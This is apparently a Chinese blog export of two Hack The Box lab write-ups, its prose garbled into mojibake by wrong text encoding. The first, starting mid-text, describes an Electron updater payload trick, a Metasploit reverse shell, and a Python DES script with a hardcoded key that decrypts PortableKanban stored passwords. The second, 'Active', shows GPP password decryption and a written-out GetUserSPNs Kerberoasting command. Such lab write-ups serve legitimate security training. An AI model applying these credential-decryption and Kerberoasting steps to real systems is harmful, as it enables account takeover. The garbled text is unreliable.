<p>æŸ¥çœ‹å®Œè¿™äº›ä¿¡æ¯åï¼Œæˆ‘ä»¬ç»§ç»­è®¿é—®webæœåŠ¡ã€‚åœ¨æœåŠ¡çš„åº•ç«¯å­˜åœ¨ä¸€ä¸ªé‚®ç®±è´¦å·å’ŒåŸŸåï¼Œæˆ‘ä»¬å…ˆæ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­ï¼Œä¾¿äºåé¢è¿›è¡Œç›®å½•çˆ†ç ´å’Œå­åŸŸåçš„æœé›†ã€‚<br><img src="https://img-blog.csdnimg.cn/35cf8a81609b4187930f03c62fcf602d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±ä½¿ç”¨<code>gobuster</code>è¿›è¡ŒåŸŸåå’Œç›®å½•çš„çˆ†ç ´å§<br><img src="https://img-blog.csdnimg.cn/916619d4e1dc4bfba3e44627be4f0f36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/b59b2cb6beb94f13bd94e36d031e5dba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå“ï¼è¿˜æ˜¯è€è€å®å®å»ä¸‹è½½è½¯ä»¶å§ã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/cc46996341604dffb098519776c2cfc8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ˜¯ä¸ªexeç¨‹åºï¼Œé‚£æˆ‘ä»¬æŠŠå®ƒä¸¢Windowsä¸Šè¿è¡Œçœ‹çœ‹æ•ˆæœæ˜¯æ€ä¹ˆæ ·çš„<br><img src="https://img-blog.csdnimg.cn/aea7a78db0594a95b20e01811fc600ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨ymlæ–‡ä»¶ä¸­å‘ç°äº†è¿™æ˜¯ä¸€ä¸ªç”µå­åº”ç”¨ç¨‹åº<br><img src="https://img-blog.csdnimg.cn/1447b123093e4cf79c5fbdf992c90238.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ ¹æ®æœç´¢åˆ°çš„ä¿¡æ¯ï¼Œä¸Šè°·æ­Œè¿›è¡Œæœç´¢ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä½å¤§ä½¬å‘ç°äº†è¿™ä¸ªæ¼æ´<br><img src="https://img-blog.csdnimg.cn/d4b8f3b4ba784683918c21291c351027.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/3576872644644aef95d67125deffcd4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤§ä½¬å·²ç»ç»™å‡ºäº†æ¼æ´åˆ©ç”¨çš„æ–¹æ³•ï¼Œé¦–å…ˆå…ˆä½¿ç”¨åŒ…å«å•å¼•å·çš„æ–‡ä»¶åï¼Œç„¶åé‡æ–°è®¡ç®—æ–‡ä»¶å“ˆå¸Œä»¥åŒ¹é…æ”»å‡»è€…æä¾›çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/2ce2ad37d7314f4781ca47e3372b791c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªå¸¦æœ‰å•å¼•å·çš„æœ‰æ•ˆè½½è·<br><img src="https://img-blog.csdnimg.cn/841300482268465f928a7a1c6029c243.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ª sha512 sum hash å¹¶å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åè¿›ä¸€æ­¥è½¬æ¢ä¸ºbase64<br><img src="https://img-blog.csdnimg.cn/5222e5c555ae452499acff13d2f7999a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬æ–°å»ºlatest.ymlè¿™ä¸ªæ–‡ä»¶ï¼Œå°†ä¸Šé¢ç”Ÿæˆçš„å€¼è¿›è¡Œå¤åˆ¶ç²˜è´´<br><img src="https://img-blog.csdnimg.cn/d5c11c4ee72b45f09ef3842b265aec6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç´§æ¥ç€æˆ‘ä»¬ä½¿ç”¨pythonå¼€å¯ä¸€ä¸ªæœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/6a8bfdbfe08e4dbaad426ef2204b19f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸‰ä¸ªæ–‡ä»¶å¤¹éƒ½è¦æ›¿æ¢æ‰ymlæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/51201bef231a46a9a2b2221c45ffeb40.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/99de167220ab45808c982e771e32f731.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬åœ¨msfä¸Šå¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œè®¾ç½®å¥½åŸºæœ¬å‚æ•°åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå¼¹çš„shell<br><img src="https://img-blog.csdnimg.cn/8cd39b8f18d34046a6a3a1abd41d1bd4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2ffa34dc528d4bffbf22bbff28573e83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„æƒé™</p>
<p><img src="https://img-blog.csdnimg.cn/46fc63e01a074f8780b9977a64491034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥cmdç»ˆç«¯è¿›è¡Œæ“ä½œ<br><img src="https://img-blog.csdnimg.cn/572df466d9dd4791a92d255ca60aa7a7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥<code>Program Files</code>è¿™ä¸ªç›®å½•æŸ¥çœ‹ä¸»æœºéƒ½å®‰è£…äº†å“ªäº›åº”ç”¨ç¨‹åºã€‚å¯ä»¥çœ‹åˆ°å®‰è£…äº†Redisæ•°æ®åº“ï¼Œæ˜¯ä¸æ˜¯æƒ³è¯•è¯•æœªæˆæƒè®¿é—®ï¼Ÿè¿™æ˜¯ç›´è§‰å“ˆå“ˆ<br><img src="https://img-blog.csdnimg.cn/9a3ff33f781548e7be38f9fbb77d972b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å…ˆè¿›å…¥è¿™ä¸ªç›®å½•ï¼Œçœ‹çœ‹é…ç½®æ–‡ä»¶æ˜¯å¦éœ€è¦å¯†ç è¿›è¡Œç™»å½•çš„ã€‚æˆ‘ä»¬æŸ¥æ‰¾<code>redis.windows-service.conf</code>è¿™ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤<code>type redis.windows-service.conf | findstr requirepass</code>å¿«é€ŸæŸ¥æ‰¾åˆ°ç™»å½•æ•°æ®åº“çš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/bb3958f354d14907842c4a54f90141be.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶å‘ç°äº†å¯†ç ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å°è¯•å¯ä¸å¯ä»¥ç™»å½•æˆåŠŸå§<br><img src="https://img-blog.csdnimg.cn/73ef19ef23b04f979996089529a2ec3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åˆ—å‡ºæ‰€æœ‰çš„hashçœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒæœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/21d54e0c5d914c8ea4288315af18521b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹userå¯¹åº”çš„ä¿¡æ¯ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç®¡ç†å‘˜ï¼Œå¹¶ä¸”è¿˜æŒ–æ˜åˆ°äº†ä»–å¯¹åº”çš„hashå€¼<code>Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</code><br><img src="https://img-blog.csdnimg.cn/3bf1bf2cbfb6417c9058a3d05d874987.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶æ¶‰åŠåˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬å°±å»Usersç›®å½•ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯å§ã€‚ç„¶è€Œåœ¨jasonçš„æ¡Œé¢ä¸Šï¼Œæˆ‘ä»¬çœ‹åˆ°äº†user.txtæ–‡ä»¶ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflagå€¼<img src="https://img-blog.csdnimg.cn/806ca1c22ee14f7fa5bb5688113ff486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="t"><br>åœ¨jasonçš„ä¸»æœºä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†ä»–å®‰è£…äº†ä¸¤ä¸ªåº”ç”¨ç¨‹åºï¼Œä¸€ä¸ªæ˜¯<code>node_modules</code>å’Œ<code>PortableKanban</code><br><img src="https://img-blog.csdnimg.cn/171f022c449c4fdda60d7e6c67bca7a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/1bc9495245b24508b8408bee3570a7e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹cfgé…ç½®æ–‡ä»¶ï¼Œå‘ç°äº†å¯¹åº”çš„hashå€¼<code>Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb</code><br><img src="https://img-blog.csdnimg.cn/96ad43ed232e4c928dfb0b255cf0b550.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬åœ¨exploit-dbä¸­æœç´¢åˆ°å¯¹åº”çš„æ¼æ´åˆ©ç”¨ä»£ç <br><img src="https://img-blog.csdnimg.cn/c205078ffcc14aff81bba88d60aa34ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯¹è¿™ä¸ªåˆ©ç”¨è„šæœ¬è¿›è¡Œç®€æ´ï¼Œè®©å®ƒç›´æ¥è¾“å‡ºå¯¹åº”çš„æ˜æ–‡å€¼ã€‚å¾—åˆ°æ˜æ–‡å€¼<code>kidvscat_yes_kidvscat</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment">#python3 -m pip install des</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">        <span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&#x27;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/938feaacbc2d46888b987f570b3a166f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç™»å½•æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/020f2b5f8b624d2b9420511bc70c6941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>SMB</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Active</title>
    <url>/2021/12/24/Active/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/eda8a039099d4943bbdadeca0b30a10a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°ä¸»æœºå¼€æ”¾äº†135,445,88è¿™äº›å¸¸è§çš„ç«¯å£<br><img src="https://img-blog.csdnimg.cn/5cf14b42521c4a969e73a389b2407517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å¯ä»¥åŒ¿åç™»å½•smbæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/e3d0be21298842868f97f94a04e6481e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æˆ‘ä»¬çœ‹åˆ°å­˜åœ¨ä¸€ä¸ª<code>Replication</code>çš„ç›®å½•ï¼Œæˆ‘ä»¬å°è¯•ç™»å½•è¿›è¿™ä¸ªç›®å½•çœ‹çœ‹ã€‚å‘ç°å­˜åœ¨<code>active.htb</code>ç›®å½•ï¼Œå¹¶ä¸”è¯¥ç›®å½•ä¸‹æœ‰å‡ ä¸ªæœ‰ä»·å€¼çš„ç›®å½•ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/5539c4e4a9ad4b5da24575f1cae90b36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ç»è¿‡ç»†å¿ƒæŸ¥çœ‹åï¼Œåªæœ‰åœ¨<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ª<code>Groups.xml</code>æ–‡ä»¶ï¼Œç»è¿‡æŸ¥çœ‹è¿™æ˜¯ä¸€ä¸ªç»„ç­–ç•¥æ–‡ä»¶ï¼Œç”¨äºå¸æˆ·ç®¡ç†çš„ç»„ç­–ç•¥å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„â€œGroups.xmlâ€æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶éšè—åœ¨ SYSVOL æ–‡ä»¶å¤¹ä¸­ã€‚<br><img src="https://img-blog.csdnimg.cn/3dfeaf7a43274b6db80c1986b56c764c.png?x-oss-process=image/watermark,type%EE%80%86ZHJvaWRzYW5zZmFsbGJhY2s,shadow%EE%80%8650,text%EE%80%86Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size%EE%80%8620,color%EE%80%86FFFFFF,t%EE%80%8670,g%EE%80%86se,x%EE%80%8616" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºè¿™ä¸ªæ–‡ä»¶ä½¿ç”¨äº†ç‰¹æ®Šçš„ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>gpp-decrypt.py</code>è¿™ä¸ªè„šæœ¬è¿›è¡Œè§£å¯†ï¼Œè§£å¯†å‡ºæ¥çš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://img-blog.csdnimg.cn/3b1d134c71474bf78e60b56c7094f613.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æœ‰äº†è´¦æˆ·å’Œå¯†ç åï¼Œæˆ‘ä»¬ç™»å½•SMBæœåŠ¡å¯ä»¥æŸ¥çœ‹æ›´å¤šçš„å…±äº«<br><img src="https://img-blog.csdnimg.cn/a0cabca528234f819d7f3fac04fd95c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬ä½¿ç”¨è´¦æˆ·å¯†ç è®¿é—®Userså…±äº«<br><img src="https://img-blog.csdnimg.cn/3d172d64bc1c426399eefb0f548f5fff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ¡Œé¢ä¸Šæ‰¾åˆ°ç¬¬ä¸€ä¸ªç­”æ¡ˆå€¼<br><img src="https://img-blog.csdnimg.cn/9465fa15bea246989886ef686a471ddc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬ä½¿ç”¨<code>rpcclient</code>æšä¸¾ç”¨æˆ·åå’Œç”¨æˆ·ç»„<br><img src="https://img-blog.csdnimg.cn/fe3c3ce5801a4fca8ff2eae28e6cc801.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨<code>GetUserSPNs.py</code>è„šæœ¬è·å–ä¸æ™®é€šç”¨æˆ·å¸æˆ·å…³è”çš„æœåŠ¡ä¸»ä½“åç§°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/18a215bbad5044eea14f81afb92ed4a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è·å–åˆ°å“ˆå¸Œå€¼åï¼Œä½¿ç”¨johnæ¥ç ´è§£å¾—åˆ°æ˜æ–‡å¯†ç ã€‚<br><img src="https://img-blog.csdnimg.cn/fefaa6cda3e74dbf93337c78a2fededc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç°åœ¨æˆ‘ä»¬æœ‰äº†ç®¡ç†å‘˜çš„å‡­æ®åï¼Œå¯ä»¥å…ˆçœ‹çœ‹ç®¡ç†å‘˜å¯ä»¥è®¿é—®å“ªäº›å…±äº«ã€‚å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®Cç›˜çš„å…±äº«<br><img src="https://img-blog.csdnimg.cn/ddc1a806b114476996349f7104571698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è´¦å·å¯†ç ç™»å½•è¿›å…¥Cç›˜ç›®å½•<br><img src="https://img-blog.csdnimg.cn/44b03ce98746402491959058ebfaa443.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¹¶åœ¨æ¡Œé¢ä¸ŠæŸ¥æ‰¾åˆ°root.txtæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/cdd2ab04ba094a5b9ec52a984a7b800f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
</search>
